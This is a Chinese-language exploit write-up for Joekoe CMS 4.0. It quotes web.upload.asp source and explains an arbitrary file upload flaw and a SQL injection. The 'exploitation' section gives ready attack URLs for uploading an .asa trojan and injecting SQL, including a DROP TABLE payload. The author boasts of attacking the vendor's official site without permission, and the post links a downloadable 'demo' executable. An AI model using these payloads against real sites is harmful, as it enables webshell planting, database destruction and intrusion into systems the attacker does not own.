@@ -1,0 +1,159 @@
+前段时间读了读乔客,发现在乔客4.0版本中存在两个高危漏洞,一个上传漏洞,可以随意上传任意文件,包括ASP,另一个是SQL注入,甚至还有返回错误信息,可怕啊
+
+     上传漏洞:
+看\common\include\web.upload.asp 中的代码
+
+-----------------------------------------------------------------------------------------------------------------------------------
+
+sub doPageLoad()
+if APP_STATUS="close" then
+   treeData.addItem "_status","error.message"
+   treeData.addItem "_message","网站暂时因关闭维护中！请稍候..."
+   exit sub
+end if
+up.doInit()
+if not upConfig.isInit then
+   treeData.addItem "_status","error.message"
+   treeData.addItem "_message","上传文件的参数不正确！"
+else
+   doPageLoadUser()
+   select case upConfig.channel
+   case "forum"
+    upConfig.setSaveDir(upConfig.getSaveDir&(left(ops.time.toConvertString("",10),6)&DIR_SEPARATOR))
+    upConfig.filename=""
+   case "user.face"
+    upConfig.filename="face_"&upConfig.userid
+    upConfig.setSaveDir("face"&DIR_SEPARATOR)
+    upConfig.filetype="gif"
+   case "blog.logo"
+    upConfig.setSaveDir("blog"&DIR_SEPARATOR)
+    upConfig.filetype="gif"
+   case else
+    if instr(upConfig.channel,".")>0 then
+     upConfig.setSaveDir(mid(upConfig.channel,1,instr(upConfig.channel,".")-1)&DIR_SEPARATOR)
+    end if
+    if instr(upConfig.fileinput,"url")>0 then
+     upConfig.filetype="affix"
+    end if
+   end select
+   if len(upConfig.getSaveDir())<3 then
+    treeData.addItem "_status","error.message"
+    treeData.addItem "_message","上传文件的参数不正确！"
+    exit sub
+   end if
+  
+   if 1=1 then
+    upConfig.setData "zoom.channel.width",120
+    upConfig.setData "zoom.channel.height",90
+   end if
+  
+   upConfig.setBaseDir(DIR_ROOT&DIR_UPLOAD)
+   upConfig.setBasePath(opsDirPath(DIR_ROOT&DIR_UPLOAD))
+   upConfig.setBaseURL(URL_UPLOAD)
+   up.doLoad()
+end if
+end sub
+
+-----------------------------------------------------------------------------------------------------------------------------------
+
+这段代码通过channel判断是否给上传类型赋值,如果channel不等于forum、user.face、blog.logo的时候判断fileinput是否包含url，如果不包含，upConfig.filetype就不赋值，继续往下看
+------------------------------------------------------------------------
+   if up.isPost() then
+    call doParseUploadData()
+    treeData.addItem "_status","succeed"
+    dim tmpFormMode,tmpFileValue,tmpThumbValue
+    tmpFormMode="set"
+    if upConfig.channel="user.face" then
+     tmpLinkMode="no"
+     tmpFileValue="#"&up.getFileInfo("filename")
+    else
+     tmpFileValue=up.getFileInfo("file.path")
+     select case upConfig.filetype
+     case "file"
+      tmpLinkMode="no"
+      'tmpFileValue=up.getFileInfo("file.path")
+     case "pic","spic","pics","affix","gif","jpg","jpeg","bmp","png"
+      tmpLinkMode="no"
+      tmpThumbValue=up.getFileInfo("thumb.path")
+     case else
+      tmpLinkMode="again"
+      tmpFormMode="append"
+      dim tmpFileType:tmpFileType=lcase(up.getFileInfo("filetype"))
+      select case tmpFileType
+      case "gif","jpg","jpeg","bmp","png"
+       tmpFileValue="[img]upload/"&up.getFileInfo("file.path")&"[/img]"
+      case "swf"
+       tmpFileValue="[flash=350,250]upload/"&up.getFileInfo("file.path")&"[/flash]"
+      case else
+       tmpFileValue="[download="&tmpFileType&"]upload_download.asp?id="&upConfig.fileid&"[/download]"
+      end select
+     end select
+    end if
+    treeData.addItem "_form.mode",tmpFormMode
+    treeData.addItem "_form.filevalue",tmpFileValue
+    treeData.addItem "_form.thumbvalue",tmpThumbValue
+   end if
+----------------------------------------------------------------------------------------------------
+这段代码判断upConfig.filetype，然后定义上传文件的后缀名，只要之前upConfig.filetype没被赋值，且不是gif,jpg,jpeg,bmp,png,swf,就
+
+tmpFileValue="[download="&tmpFileType&"]upload_download.asp?id="&upConfig.fileid&"[/download]"，看到这个，大家眼睛都放光了，根据用户的定义来判断上传类型，就好比问一个要偷东西的人：“你是贼么？”，这段代码也太XX了，估计之前也有不少人读出来了，只不过没公开而已
+
+
+     SQL注入漏洞
+还是在web.upload.asp中：
+--------------------------------------------------------------------------------------------------------
+...........
+sub doParseUploadData()
+dim tmpFilePath,tmpFileType,tmpFileSize,tmpName
+tmpFilePath=up.getFileInfo("file.path")
+tmpFileType=up.getFileInfo("filetype")
+tmpFileSize=opsCommon.toInt(up.getFileInfo("filesize"))
+tmpName=up.getFileInfo("name")
+dim tmpChannel,tmpDataid,tmpType,tmpSQL,tmpID
+tmpChannel=upConfig.channel
+tmpDataid=0
+tmpType=0
+select case upConfig.channel
+case "user.face"
+   tmpDataid=upConfig.userid
+   tmpChannel="face"
+   tmpType=1
+   tmpSQL="select top 1 u_id from db_sys_upload where nsort='"&tmpChannel&"' and iid="&tmpDataid&""
+case "blog.logo"
+   tmpDataid=toInt(ops.client.getSession("user.blogid"))
+   if tmpDataid<1 then tmpDataid=upConfig.userid
+   tmpChannel="blog"
+   tmptype=1
+   tmpSQL="select top 1 u_id from db_sys_upload where nsort='"&tmpChannel&"' and iid="&tmpDataid&""
+case else
+   tmpSQL="select top 1 u_id from db_sys_upload where u_url='"&tmpFilePath&"'"
+end select
+..........
+-------------------------------------------------------------------------------------------------------------
+看这句tmpSQL="select top 1 u_id from db_sys_upload where u_url='"&tmpFilePath&"'"，u_url来自&tmpFilePath&，而&tmpFilePath&来自up.getFileInfo("file.path")，呵呵，没有经过任何过滤就放到SQL查询语句里面查询了。
+
+
+
+利用方法：
+         1 .上传漏洞：很好利用，把channel变量改一下，只要不等于forum、user.face、blog.logo就行，然后filetype改成asa,就可以光明正大的上传木马了，具体url可以这样common/upload.asp?channel=use&filetype=asa&filename=&fileinput=u_face&formname=&thumbname=&thumbinput=，然后上传
+
+         2. SQL注入漏洞：在Channel变量中加入诸如语句，比如：common/upload.asp?channel=use'&filetype=gif&filename=&fileinput=u_face&formname=&thumbname=&thumbinput=,然后上传，就会报错
+----------------------------------------------------------------------------------------------------------------------------------
+
+Joekoe CMS 4.0
+错误信息:
+select top 1 u_id from db_sys_upload where u_url='user'/20070722031234c.gif'
+原始错误:
+Error #-2147217900, 第 1 行: 'c' 附近有语法错误。 Microsoft OLE DB Provider for SQL Server
+返回首页
+Processed in 0.188 s, 1 queries, 54 Cache.
+
+-----------------------------------------------------------------------------------------------------------------------------------
+注入的时候有一定要注意，在执行到漏洞代码之前，会建立以Channel变量命名的文件夹，如果文件夹建立失败，就无法执行到漏洞代码，所以诸如语句里面不能有<>|"?*:/\，还有，注入代码执行后，会在upload文件夹下面建立以Channel变量命名的文件夹，也就是说如果你的诸如语句是use' DROP TABLE Tmp--,那么他的upload目录下就会多个叫做use' DROP TABLE Tmp--的目录，*_*是不是很恐怖，刚发现这个漏洞的那天晚上去搞官网，留下了几十个这样的BT目录，结果第二天被发现了，换了管理员帐号密码 *_*
+
+
+     几年前用乔客的网站随处可见,现在已经很少了,为什么?看了代码我才明白,艾,要发展还得靠努力啊
+
+     开发人员应该已经知道了这两个漏洞的存在,但是迟迟没有出补丁,一直到现在都没有见到这两个漏洞的补丁,真是搞不懂........
+
+利用 录像:www.cub007.cn/demo/qiaoke.exe   下载后把后缀名改成rar打开
